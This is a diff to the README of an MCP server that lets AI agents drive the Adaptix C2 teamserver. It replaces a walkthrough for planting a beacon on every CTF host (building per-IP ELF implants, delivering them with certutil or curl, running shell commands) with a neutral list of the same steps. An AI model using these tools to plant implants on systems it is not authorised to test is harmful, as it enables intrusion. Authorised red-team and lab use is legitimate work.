@@ -16,7 +16,7 @@ version-compatibility warning at the top of the README first.**
 
 Contents: [Before the first call](#before-the-first-call) · [Register the
 server](#register-the-server) · [Walkthrough: recon](#walkthrough-recon) ·
-[Walkthrough: a beacon on every host](#walkthrough-a-beacon-on-every-host) ·
+[Walkthrough: the primitives, in order](#walkthrough-the-primitives-in-order) ·
 [Reading the responses](#reading-the-responses) · [Raw API by
 hand](#raw-api-by-hand)
 
@@ -62,45 +62,32 @@ Claude Code / any `.mcp.json` client:
 Nothing here mutates: this loop is safe to run against a live engagement
 without changing state.
 
-## Walkthrough: a beacon on every host
+## Walkthrough: the primitives, in order
 
-The case this exists for — a CTF or lab with N hosts and an operator watching
-the Adaptix GUI. The MCP does the C2 half; delivery to each host is yours.
+A client (agent framework, script, operator) drives these in sequence; this
+server adds no sequencing of its own.
 
-1. **Listener, once.**
-   `adaptix_listener_create {name:"ctf-http", type:"BeaconHTTP", config:"{...}"}`.
-   The config is the listener type's own JSON (bind host/port, callback host,
-   TLS). The call now verifies the result: it reports `verified: true` only if
-   the listener is in `/listener/list`, and otherwise fails with what the
-   teamserver said. A listener that "started" but is not in the list is the
-   classic reason beacons never arrive.
-2. **Artifact per host, labelled.**
+1. **Connect.** `adaptix_server_status` — wrong password, wrong endpoint path or
+   TLS trust fail here, before anything else.
+2. **Listener.** `adaptix_listener_create {name, type:"BeaconHTTP", config:"…"}`
+   with the extender's own config JSON. `verified: true` means the listener is
+   in `/listener/list`; anything else is a refusal with the teamserver's reason
+   (the teamserver answers HTTP 200 even when it rejects the config).
+3. **Build.** `adaptix_agent_generate {agent, listener_name, config, label}`
+   returns `path`, `fileName` and `bytes`; `label` (the target IP or hostname)
+   is folded into the name so several builds never collide. A rejected build
+   fails with the teamserver's reason and writes nothing.
+4. **Prove it.** `adaptix_agent_wait {expected, match, timeout_s}` blocks until
+   that many agents are present; `ok:false` carries the count it reached.
+5. **Task.** `adaptix_agent_command_execute {agent_id, cmdline, data}`, with
+   `wait_answer` for the inline result or `adaptix_task_list` after the fact.
+6. **Cleanup.** `adaptix_agent_remove`, `adaptix_task_delete`,
+   `adaptix_listener_stop`.
 
-   ```json
-   {"agent":"beacon","listener_name":"ctf-http",
-    "config":"{\"os\":\"linux\",\"arch\":\"amd64\",\"format\":\"elf\"}",
-    "label":"10.10.10.5",
-    "output_dir":"/path/to/assessment/logs/c2"}
-   ```
-
-   Result: `path .../beacon-10.10.10.5.elf`. Repeat for each host. The label is
-   what keeps four builds four files; without it the teamserver's identical
-   name would have the second build overwrite the first, and the counter
-   (`-2`, `-3`) is the fallback if you forget.
-3. **Deliver and run** it on the host — a loopback web server reached through
-   the pivot, `certutil`/`curl`, an SMB share: outside this MCP.
-4. **Wait for check-in.**
-   `adaptix_agent_wait {expected:1, match:"10.10.10.5", timeout_s:120}` per
-   host, or `{expected:4}` once after the batch. `ok:true` returns the agent
-   records; `ok:false` returns the count it reached plus the usual causes
-   (payload never ran, no egress, the build calls a different listener).
-5. **Task it.**
-   `adaptix_agent_command_execute {agent_id:"...", cmdline:"shell",
-   data:"{\"command\":\"id\"}", wait_answer:true}` for the answer inline, or
-   `wait_answer:false` then `adaptix_task_list` — output is asynchronous, so
-   poll rather than assuming failure.
-6. **Cleanup.** `adaptix_agent_remove {agent_ids:[...]}` and
-   `adaptix_task_delete`; stop the listener last so re-connects still land.
+What is *not* here, on purpose: starting/stopping the teamserver, deciding which
+hosts to touch, delivering the artifact to a host, and keeping an engagement
+ledger. Those belong to the client — a tool that plans cannot be gated or
+recorded by the thing that owns the engagement.
 
 ## Reading the responses
 
